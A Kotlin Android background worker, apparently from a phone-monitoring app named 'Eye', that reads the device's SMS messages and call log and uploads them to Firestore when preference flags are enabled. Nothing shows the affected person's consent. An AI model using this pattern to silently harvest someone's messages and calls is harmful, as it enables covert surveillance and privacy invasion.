package com.eye.service

import android.content.Context
import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.eye.data.local.Preference
import com.eye.di.HiltEntryPoint
import com.eye.utils.EyeDetails.readCallLog
import com.eye.utils.EyeDetails.readSMS
import dagger.hilt.android.EntryPointAccessors
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class EyeWorker(private val context: Context, params: WorkerParameters) : Worker(context, params) {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun doWork(): Result {
        val preference : Preference = Preference(context)
        try {
            println("workerLive")
            val hiltEntryPoint =
                EntryPointAccessors.fromApplication(context, HiltEntryPoint::class.java)
            val firestoreRepository = hiltEntryPoint.firestoreRepository()
                CoroutineScope(SupervisorJob()).launch {

                    if (preference.isSMS){
                        val smsReader = context.readSMS()?.groupBy {
                            it.date
                        }
                        if (smsReader != null) {
                            firestoreRepository.uploadSMSLog(smsReader)
                        }
                    }
                    if (preference.isCallLog){
                        val callLogs = context.readCallLog()?.groupBy {
                            it.date
                        }

                        if (callLogs != null) {
                            firestoreRepository.uploadCallLog(callLogs)
                        }
                    }

                }

            return Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        }

    }


}